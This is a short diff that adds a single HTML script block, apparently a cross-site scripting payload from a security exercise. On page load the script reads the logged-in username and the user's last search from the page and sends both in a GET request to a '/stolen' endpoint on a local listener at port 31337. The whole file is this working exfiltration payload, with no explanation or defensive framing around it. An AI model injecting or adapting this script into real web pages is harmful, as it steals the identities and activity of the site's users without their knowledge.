@@ -1,0 +1,9 @@
+<script>
+	function attack() {
+		var username = $('#logged-in-user').text();
+		var last_search = $('.list-group-item:eq(1)').text();
+		var url = 'https://127.0.0.1:31337/stolen?user=' + username  + '&last_search=' + last_search;
+		$.get(url);
+	}
+window.onload = attack;
+</script>
